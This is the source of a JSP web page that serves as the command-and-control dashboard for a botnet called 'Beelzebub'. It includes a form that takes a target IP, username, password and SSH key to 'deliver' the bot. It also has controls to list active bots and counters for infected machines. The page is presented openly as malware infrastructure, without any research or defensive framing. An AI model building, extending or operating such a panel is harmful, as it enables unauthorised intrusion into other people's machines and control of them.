<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>       
<head>
  <title>Beelzebub C&C Server</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" type="image/jpg" href="beelzebub.jpg" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <style>
    /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
    .row.content {height: 550px}
    
    /* Set gray background color and 100% height */
    .sidenav {
      background-color: #f1f1f1;
      height: 100%;
    }
    .botnet {
    		background-color: white;
    }
    /* On small screens, set height to 'auto' for the grid */
    @media screen and (max-width: 767px) {
      .row.content {height: auto;} 
    }
  </style>
</head>
<body>

<nav class="navbar navbar-inverse visible-xs">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
      <a class="navbar-brand" href="index.jsp"><img src="beelzebub.jpg" width="30" height="30"></a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
        <li class="active"><a href="">Dashboard</a></li>
        <!-- <li><a href="/bots">Botnet</a></li> -->
        <!-- <li><a href="#">Database</a></li>
        <li><a href="#">Something Else...</a></li> -->
      </ul>
    </div>
  </div>
</nav>

<div class="container-fluid">
  <div class="row content">
    <div class="col-sm-3 sidenav hidden-xs">
      <h2>Beelzebub </h2>
      <a class="navbar-brand" href="index.jsp"><img src="beelzebub.jpg" width="100" height="100"></a>
      <br>
      <br>
      <br>
      <br>
      <br>
      <br>
      <ul class="nav nav-pills nav-stacked">
        <li class="active"><a href="bots?name=refreshBots">Dashboard</a></li>
       <!-- <li><a href="/Beelzebub/bots">Botnet</a></li> -->
        <!-- <li><a href="#">Database</a></li>
        <li><a href="#">Something Else...</a></li> -->
        </ul>
        <br>
        		        		<form class="adminssh" method="POST" onclick=alert("Delivering Beelzebub") action="/Beelzebub/bots?name=Deliver">
						 <div class="form-group">
						   <label for="ip">Target IP:</label>
						   <input name="ip" type="text" class="form-control" id="ip" placeholder="127.0.0.1">
						   <label for="uname">Username:</label>
						   <input name="uname" type="text" class="form-control" id="uname" placeholder="Username">
						   <label for="pass">Password:</label>
						   <input name="pass" type="text" class="form-control" id="pass" placeholder="Password">
						   <label for="key">SSH Key:</label>
						   <input name="key" type="text" class="form-control" id="key" placeholder="Insert SSH Key Here...">
						   
						</div>
						<div class="col-sm-3)">
							<button type="submit" class="btn btn-default">Deliver</button>
						</div>
					</form>
					<br>
		        		<p> Input the required information of the target machine to deliver Beelzebub. </p>
    </div>
    <br>
    
    <div class="col-sm-9">
      <div class="well">
        <h4>Beelzebub Botnet Command And Control Page</h4>
	<!-- <div class = buttonBar> -->
	<br>
		<p> Click a button to interact with your botnet... </p>
				<br/>
		<div class="row center-align" role="attackgroup" aria-label="Attack">
			<div class="col-sm-9" role="buttonbar" aria-label="botloader">
				<form method="POST" action="/Beelzebub/bots?name=refreshBots">
				        		<button type="SUBMIT" action="/Beelzebub/bots?name=refreshBots" value="refreshBots"> Refresh Bot List</button>
				</form>
				<br>
				<form method="POST" action="/Beelzebub/bots?name=Active">
					<button type="SUBMIT" action="/Beelzebub/bots?name=Active" value="Active"> Show Active Bots</button>
				</form>
			</div>
		</div>
      </div>
      <div class="row">
        <div class="col-sm-3">
          <div class="well">
            <h4>Infected Machines</h4>
            <p>${count}</p> 
          </div>
        </div>
        <div class="col-sm-3">
          <div class="well">
            <h4>Active Bots</h4>
            <p>${status}</p> 
          </div>
        </div>
        </div>
      <div class="well">
	  			<!-- Dynamically Generate Bot Windows -->
	  			<div class="row">
	  			<h2> Your Beelzebub Botnet:</h2> <br />
	  			<div class = "botnet">
	  				${message}
	  				</div>
		       </div>
	      </div>

</div>
<br>
<br>
<br>
<br>
<script src="JavaScript/botnet.js" ></script>
</body>
</html>